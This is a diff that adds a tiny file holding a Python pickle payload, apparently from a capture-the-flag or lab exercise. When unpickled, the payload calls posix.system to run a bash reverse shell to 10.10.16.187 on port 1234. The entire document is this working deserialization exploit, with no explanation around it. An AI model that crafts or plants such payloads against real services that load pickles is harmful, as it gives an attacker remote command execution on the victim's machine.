@@ -1,0 +1,8 @@
+p1cposix
+system
+p1
+(S'bash -c "bash -i >& /dev/tcp/10.10.16.187/1234 0>&1"'
+p2
+tp3
+Rp4
+.
